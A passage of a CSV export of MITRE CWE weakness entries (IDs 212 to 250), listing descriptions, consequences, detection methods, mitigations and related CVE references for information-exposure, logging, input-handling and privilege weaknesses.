expose sensitive information::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP23:ENTRY NAME:Exposed Data::\",::215::463::54::7::,\"\",\n212,\"Improper Removal of Sensitive Information Before Storage or Transfer\",Base,Incomplete,\"The product stores, transfers, or shares a resource that contains sensitive information, but it does not properly remove that information before the product makes the resource available to unauthorized actors.\",\"Resources that may contain sensitive data include documents, packets, messages, databases, etc. While this data may be useful to an individual user or small set of users who share the resource, it may need to be removed before the resource can be shared outside of the trusted group. The process of removal is sometimes called cleansing or scrubbing. For example, a product for editing documents might not remove sensitive data such as reviewer comments or the local pathname where the document is stored. Or, a proxy might not remove an internal IP address from headers before making an outgoing request to an Internet site.\",::NATURE:ChildOf:CWE ID:669:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:669:VIEW ID:1003:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:201:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::ORDINALITY:Resultant::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::PHASE:Operation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Files or Directories:IMPACT:Read Application Data:NOTE:Sensitive data may be exposed to an unauthorized actor in another control sphere. This may have a wide range of secondary consequences which will depend on what data is exposed. One possibility is the exposure of system data allowing an attacker to craft a specific, more effective attack.::\",\"\",\"::PHASE:Requirements:DESCRIPTION:Clearly specify which information should be regarded as private or sensitive, and require that the product offers functionality that allows the user to cleanse the sensitive information from the resource before it is published or exported to other parties.::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Compartmentalize the system to have safe areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area. Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.::PHASE:Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:Use naming conventions and strong types to make it easier to spot when sensitive data is being used. When creating structures, objects, or other complex entities, separate the sensitive and non-sensitive data as much as possible.:EFFECTIVENESS:Defense in Depth::PHASE:Implementation:DESCRIPTION:Avoid errors related to improper resource shutdown or release (CWE-404), which may leave the sensitive data within the resource if it is in an incomplete state.::\",\"::REFERENCE:CVE-2019-3733:DESCRIPTION:Cryptography library does not clear heap memory before release:LINK:https://www.cve.org/CVERecord?id=CVE-2019-3733::REFERENCE:CVE-2005-0406:DESCRIPTION:Some image editors modify a JPEG image, but the original EXIF thumbnail image is left intact within the JPEG. (Also an interaction error).:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0406::REFERENCE:CVE-2002-0704:DESCRIPTION:NAT feature in firewall leaks internal IP addresses in ICMP error messages.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0704::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Cross-Boundary Cleansing Infoleak::\",::168::,\"::TYPE:Relationship:NOTE:This entry is intended to be different from resultant information leaks, including those that occur from improper buffer initialization and reuse, improper encryption, interaction errors, and multiple interpretation errors. This entry could be regarded as a privacy leak, depending on the type of information that is leaked.::TYPE:Relationship:NOTE:There is a close association between CWE-226 and CWE-212. The difference is partially that of perspective. CWE-226 is geared towards the final stage of the resource lifecycle, in which the resource is deleted, eliminated, expired, or otherwise released for reuse. Technically, this involves a transfer to a different control sphere, in which the original contents of the resource are no longer relevant. CWE-212, however, is intended for sensitive data in resources that are intentionally shared with others, so they are still active. This distinction is useful from the perspective of the CWE research view (CWE-1000).::TYPE:Terminology:NOTE:The terms cleansing and scrubbing have multiple uses within computing. In information security, these are used for the removal of sensitive data, but they are also used for the modification of incoming/outgoing data so that it conforms to specifications.::\",\n213,\"Exposure of Sensitive Information Due to Incompatible Policies\",Base,Draft,\"The product's intended functionality exposes information to certain actors in accordance with the developer's security policy, but this information is regarded as sensitive according to the intended security policies of other stakeholders such as the product's administrator, users, or others whose information is being processed.\",\"When handling information, the developer must consider whether the information is regarded as sensitive by different stakeholders, such as users or administrators. Each stakeholder effectively has its own intended security policy that the product is expected to uphold. When a developer does not treat that information as sensitive, this can introduce a vulnerability that violates the expectations of the product's users.\",::NATURE:ChildOf:CWE ID:200:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Policy:NOTE:This can occur when the product's policy does not account for all relevant stakeholders, or when the policies of other stakeholders are not interpreted properly.::PHASE:Requirements:NOTE:This can occur when requirements do not explicitly account for all relevant stakeholders.::PHASE:Architecture and Design:NOTE:Communications or data exchange frameworks may be chosen that exchange or provide access to more information than strictly needed.::PHASE:Implementation:NOTE:This can occur when the developer does not properly track the flow of sensitive information and how it is exposed, e.g., via an API.::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data::\",\"\",\"\",\"::REFERENCE:CVE-2002-1725:DESCRIPTION:Script calls phpinfo():LINK:https://www.cve.org/CVERecord?id=CVE-2002-1725::REFERENCE:CVE-2004-0033:DESCRIPTION:Script calls phpinfo():LINK:https://www.cve.org/CVERecord?id=CVE-2004-0033::REFERENCE:CVE-2003-1181:DESCRIPTION:Script calls phpinfo():LINK:https://www.cve.org/CVERecord?id=CVE-2003-1181::REFERENCE:CVE-2004-1422:DESCRIPTION:Script calls phpinfo():LINK:https://www.cve.org/CVERecord?id=CVE-2004-1422::REFERENCE:CVE-2004-1590:DESCRIPTION:Script calls phpinfo():LINK:https://www.cve.org/CVERecord?id=CVE-2004-1590::REFERENCE:CVE-2003-1038:DESCRIPTION:Product lists DLLs and full pathnames.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-1038::REFERENCE:CVE-2005-1205:DESCRIPTION:Telnet protocol allows servers to obtain sensitive environment information from clients.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1205::REFERENCE:CVE-2005-0488:DESCRIPTION:Telnet protocol allows servers to obtain sensitive environment information from clients.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0488::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Intended information leak::\",,\"::TYPE:Maintenance:NOTE:This entry is being considered for deprecation. It overlaps many other entries related to information exposures. It might not be essential to preserve this entry, since other key stakeholder policies are covered elsewhere, e.g. personal privacy leaks (CWE-359) and system-level exposures that are important to system administrators (CWE-497).::TYPE:Theoretical:NOTE:In vulnerability theory terms, this covers cases in which the developer's Intended Policy allows the information to be made available, but the information might be in violation of a Universal Policy in which the product's administrator should have control over which information is considered sensitive and therefore should not be exposed.::\",\n214,\"Invocation of Process Using Visible Sensitive Information\",Base,Incomplete,\"A process is invoked with sensitive command-line arguments, environment variables, or other elements that can be seen by other processes on the operating system.\",\"Many operating systems allow a user to list information about processes that are owned by other users. Other users could see information such as command line arguments or environment variable settings. When this data contains sensitive information such as credentials, it might allow other users to launch an attack against the product or related resources.\",::NATURE:ChildOf:CWE ID:497:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::PHASE:Operation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data::\",\"\",\"\",\"::REFERENCE:CVE-2005-1387:DESCRIPTION:password passed on command line:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1387::REFERENCE:CVE-2005-2291:DESCRIPTION:password passed on command line:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2291::REFERENCE:CVE-2001-1565:DESCRIPTION:username/password on command line allows local users to view via ps or other process listing programs:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1565::REFERENCE:CVE-2004-1948:DESCRIPTION:Username/password on command line allows local users to view via ps or other process listing programs.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1948::REFERENCE:CVE-1999-1270:DESCRIPTION:PGP passphrase provided as command line argument.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-1270::REFERENCE:CVE-2004-1058:DESCRIPTION:Kernel race condition allows reading of environment variables of a process that is still spawning.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1058::REFERENCE:CVE-2021-32638:DESCRIPTION:Code analysis product passes access tokens as a command-line parameter or through an environment variable, making them visible to other processes via the ps command.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-32638::\",,::System Process::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Process information infoleak to other processes::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP23:ENTRY NAME:Exposed Data::\",,\"::TYPE:Research Gap:NOTE:Under-studied, especially environment variables.::\",\n215,\"Insertion of Sensitive Information Into Debugging Code\",Base,Draft,\"The product inserts sensitive information into debugging code, which could expose this information if the debugging code is not disabled in production.\",\"When debugging, it may be necessary to report detailed information to the programmer. However, if the debugging code is not disabled when the product is operating in a production environment, then this sensitive information may be exposed to attackers.\",::NATURE:ChildOf:CWE ID:200:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Do not leave debug statements that could be executed in the source code. Ensure that all debug information is eradicated before releasing the software.::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Compartmentalize the system to have safe areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area. Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.::\",\"::REFERENCE:CVE-2004-2268:DESCRIPTION:Password exposed in debug information.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2268::REFERENCE:CVE-2002-0918:DESCRIPTION:CGI script includes sensitive information in debug messages when an error is triggered.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0918::REFERENCE:CVE-2003-1078:DESCRIPTION:FTP client with debug option enabled shows password to the screen.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-1078::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Infoleak Using Debug Information::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A6:ENTRY NAME:Information Leakage and Improper Error Handling:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A10:ENTRY NAME:Insecure Configuration Management:MAPPING FIT:CWE More Specific::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP23:ENTRY NAME:Exposed Data::\",,\"::TYPE:Relationship:NOTE:This overlaps other categories.::\",\n222,\"Truncation of Security-relevant Information\",Base,Draft,\"The product truncates the display, recording, or processing of security-relevant information in a way that can obscure the source or nature of an attack.\",\"\",::NATURE:ChildOf:CWE ID:221:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::PHASE:Operation::\",\"\",,\"::SCOPE:Non-Repudiation:IMPACT:Hide Activities:NOTE:The source of an attack will be difficult or impossible to determine. This can allow attacks to the system to continue without notice.::\",\"\",\"\",\"::REFERENCE:CVE-2005-0585:DESCRIPTION:Web browser truncates long sub-domains or paths, facilitating phishing.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0585::REFERENCE:CVE-2004-2032:DESCRIPTION:Bypass URL filter via a long URL with a large number of trailing hex-encoded space characters.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2032::REFERENCE:CVE-2003-0412:DESCRIPTION:application server does not log complete URI of a long request (truncation).:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0412::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Truncation of Security-relevant Information::\",,\"\",\n223,\"Omission of Security-relevant Information\",Base,Draft,\"The product does not record or display information that would be important for identifying the source or nature of an attack, or determining if an action is safe.\",\"\",::NATURE:ChildOf:CWE ID:221:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::PHASE:Implementation::PHASE:Operation::\",\"\",,\"::SCOPE:Non-Repudiation:IMPACT:Hide Activities:NOTE:The source of an attack will be difficult or impossible to determine. This can allow attacks to the system to continue without notice.::\",\"\",\"\",\"::REFERENCE:CVE-1999-1029:DESCRIPTION:Login attempts are not recorded if the user disconnects before the maximum number of tries.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-1029::REFERENCE:CVE-2002-1839:DESCRIPTION:Sender's IP address not recorded in outgoing e-mail.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1839::REFERENCE:CVE-2000-0542:DESCRIPTION:Failed authentication attempts are not recorded if later attempt succeeds.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0542::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Omission of Security-relevant Information::\",,\"\",\n224,\"Obscured Security-relevant Information by Alternate Name\",Base,Incomplete,\"The product records security-relevant information according to an alternate name of the affected entity, instead of the canonical name.\",\"\",::NATURE:ChildOf:CWE ID:221:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::PHASE:Operation::\",\"\",,\"::SCOPE:Non-Repudiation:SCOPE:Access Control:IMPACT:Hide Activities:IMPACT:Gain Privileges or Assume Identity::\",\"\",\"\",\"::REFERENCE:CVE-2002-0725:DESCRIPTION:Attacker performs malicious actions on a hard link to a file, obscuring the real target file.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0725::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Obscured Security-relevant Information by Alternate Name::\",,\"\",\n229,\"Improper Handling of Values\",Base,Incomplete,\"The product does not properly handle when the expected number of values for parameters, fields, or arguments is not provided in input, or if those values are undefined.\",\"\",::NATURE:ChildOf:CWE ID:228:VIEW ID:1000:ORDINAL:Primary::,\"\",,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:IMPACT:Unexpected State::\",\"\",\"\",\"\",,,\"\",,\"\",\n233,\"Improper Handling of Parameters\",Base,Incomplete,\"The product does not properly handle when the expected number of parameters, fields, or arguments is not provided in input, or if those parameters are undefined.\",\"\",::NATURE:ChildOf:CWE ID:228:VIEW ID:1000:ORDINAL:Primary::,\"\",,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:IMPACT:Unexpected State::\",\"::METHOD:Fuzzing:DESCRIPTION:Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.:EFFECTIVENESS:High::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"\",\"\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Parameter Problems::\",::39::,\"\",\n237,\"Improper Handling of Structural Elements\",Base,Incomplete,\"The product does not handle or incorrectly handles inputs that are related to complex structures.\",\"\",::NATURE:ChildOf:CWE ID:228:VIEW ID:1000:ORDINAL:Primary::,\"\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Integrity:IMPACT:Unexpected State::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Element Problems::\",,\"\",\n241,\"Improper Handling of Unexpected Data Type\",Base,Draft,\"The product does not handle or incorrectly handles when a particular element is not the expected type, e.g. it expects a digit (0-9) but is provided with a letter (A-Z).\",\"\",::NATURE:ChildOf:CWE ID:228:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Other:IMPACT:Varies by Context:IMPACT:Unexpected State::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-1999-1156:DESCRIPTION:FTP server crash via PORT command with non-numeric character.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-1156::REFERENCE:CVE-2004-0270:DESCRIPTION:Anti-virus product has assert error when line length is non-numeric.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0270::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Wrong Data Type::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO37-C:ENTRY NAME:Do not assume that fgets() or fgetws() returns a nonempty string when successful:MAPPING FIT:CWE More Abstract::\",::48::,\"::TYPE:Research Gap:NOTE:Probably under-studied.::\",\n242,\"Use of Inherently Dangerous Function\",Base,Draft,\"The product calls a function that can never be guaranteed to work safely.\",\"Certain functions behave in dangerous ways regardless of how they are used. Functions in this category were often implemented without taking security concerns into account. The gets() function is unsafe because it does not perform bounds checking on the size of its input. An attacker can easily send arbitrarily-sized input to gets() and overflow the destination buffer. Similarly, the >> operator is unsafe to use when reading into a statically-allocated character array because it does not perform bounds checking on the size of its input. An attacker can easily send arbitrarily-sized input to the >> operator and overflow the destination buffer.\",::NATURE:ChildOf:CWE ID:1177:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Varies by Context::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation Requirements:DESCRIPTION:Ban the use of dangerous functions. Use their safe equivalent.::PHASE:Testing:DESCRIPTION:Use grep or static analysis tools to spot usage of dangerous functions.::\",\"::REFERENCE:CVE-2007-4004:DESCRIPTION:FTP client uses inherently insecure gets() function and is setuid root on some systems, allowing buffer overflow:LINK:https://www.cve.org/CVERecord?id=CVE-2007-4004::\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Dangerous Functions::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:POS33-C:ENTRY NAME:Do not use vfork():MAPPING FIT:CWE More Abstract::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP3:ENTRY NAME:Use of an improper API::\",,\"\",\n243,\"Creation of chroot Jail Without Changing Working Directory\",Variant,Draft,\"The product uses the chroot() system call to create a jail, but does not change the working directory afterward. This does not prevent access to files outside of the jail.\",\"Improper use of chroot() may allow attackers to escape from the chroot jail. The chroot() function call does not change the process's current working directory, so relative paths may still refer to file system resources outside of the chroot jail after chroot() has been called.\",::NATURE:ChildOf:CWE ID:573:VIEW ID:1000::NATURE:ChildOf:CWE ID:669:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Resultant::\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Unix:OPERATING SYSTEM PREVALENCE:Undetermined::,\"::The chroot() system call allows a process to change its perception of the root directory of the file system. After properly invoking chroot(), a process cannot access any files outside the directory tree defined by the new root directory. Such an environment is called a chroot jail and is commonly used to prevent the possibility that a processes could be subverted and used to access unauthorized files. For instance, many FTP servers run in chroot jails to prevent an attacker who discovers a new vulnerability in the server from being able to download the password file or other sensitive files on the system.::\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Files or Directories::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"\",\"\",,::File or Directory::,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Directory Restriction::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP17:ENTRY NAME:Failed chroot jail::\",,\"\",\n248,\"Uncaught Exception\",Base,Draft,\"An exception is thrown from a function, but it is not caught.\",\"When an exception is not caught, it may cause the program to crash or expose sensitive information.\",::NATURE:ChildOf:CWE ID:705:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:755:VIEW ID:1000::NATURE:ChildOf:CWE ID:703:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:703:VIEW ID:1340:ORDINAL:Primary::,\"\",::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C#:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:SCOPE:Confidentiality:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:Read Application Data:NOTE:An uncaught exception could cause the system to be placed in a state that could lead to a crash, exposure of sensitive information or other unintended behaviors.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"\",\"::REFERENCE:CVE-2023-41151:DESCRIPTION:SDK for OPC Unified Architecture (OPC UA) server has uncaught exception when a socket is blocked for writing but the server tries to send an error:LINK:https://www.cve.org/CVERecord?id=CVE-2023-41151::REFERENCE:CVE-2023-21087:DESCRIPTION:Java code in a smartphone OS can encounter a boot loop due to an uncaught exception:LINK:https://www.cve.org/CVERecord?id=CVE-2023-21087::\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Often Misused: Exception Handling::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:ERR05-J:ENTRY NAME:Do not let checked exceptions escape from a finally block::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:ERR06-J:ENTRY NAME:Do not throw undeclared checked exceptions::TAXONOMY NAME:SEI CERT Perl Coding Standard:ENTRY ID:EXP31-PL:ENTRY NAME:Do not suppress or ignore exceptions:MAPPING FIT:Exact::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP4:ENTRY NAME:Unchecked Status Condition::\",,\"\",\n250,\"Execution with Unnecessary Privileges\",Base,Draft,\"The product performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses.\",\"New weaknesses can be exposed because running with extra privileges, such as root or Administrator, can disable the normal security checks being performed by the operating system or surrounding environment. Other pre-existing weaknesses can turn into security vulnerabilities if they occur while operating at raised privileges. Privilege management functions can behave in some less-than-obvious ways, and they have different quirks on different platforms. These inconsistencies are particularly pronounced if you are transitioning from one non-root user to another. Signal handlers and spawned processes run at the privilege of the owning process, so if a process is running as root when a signal fires or a sub-process is executed, the signal handler or sub-process will operate with root privileges.\",::NATURE:ChildOf:CWE ID:269:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:657:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Mobile:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::PHASE:Installation::PHASE:Architecture and Design:NOTE:If an application has this design problem, then it can be easier for the developer to make implementation-related errors such as CWE-271 (Privilege Dropping / Lowering Errors). In addition, the consequences of Privilege Chaining (CWE-268) can become more severe.::PHASE:Operation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Read Application Data:IMPACT:DoS: Crash, Exit, or Restart:NOTE:An attacker will be able to gain access to any resources that are allowed by the extra privileges. Common results include executing code, disabling services, and reading restricted data.::\",\"::METHOD:Manual Analysis:DESCRIPTION:This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.::METHOD:Black Box:DESCRIPTION:Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic. Attach the monitor to the process and perform a login. Look for library functions and system calls that indicate when privileges are being raised or dropped. Look for accesses of resources that are restricted to normal users.::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Compare binary / bytecode to application permission manifest Cost effective for partial coverage: Bytecode Weakness Analysis - including disassembler + source code weakness analysis Binary Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:High::METHOD:Manual Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Host-based Vulnerability Scanners - Examine configuration for flaws, verifying that audit mechanisms work, ensure host configuration meets certain predefined criteria:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Host Application Interface Scanner:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Manual Source Code Review (not inspections) Cost effective for partial coverage: Focused Manual Spotcheck - Focused manual analysis of source:EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:SOAR Partial::METHOD:Automated Static Analysis:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Configuration Checker Permission Manifest Analysis:EFFECTIVENESS:SOAR Partial::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.) Formal Methods / Correct-By-Construction Cost effective for partial coverage: Attack Modeling:EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in 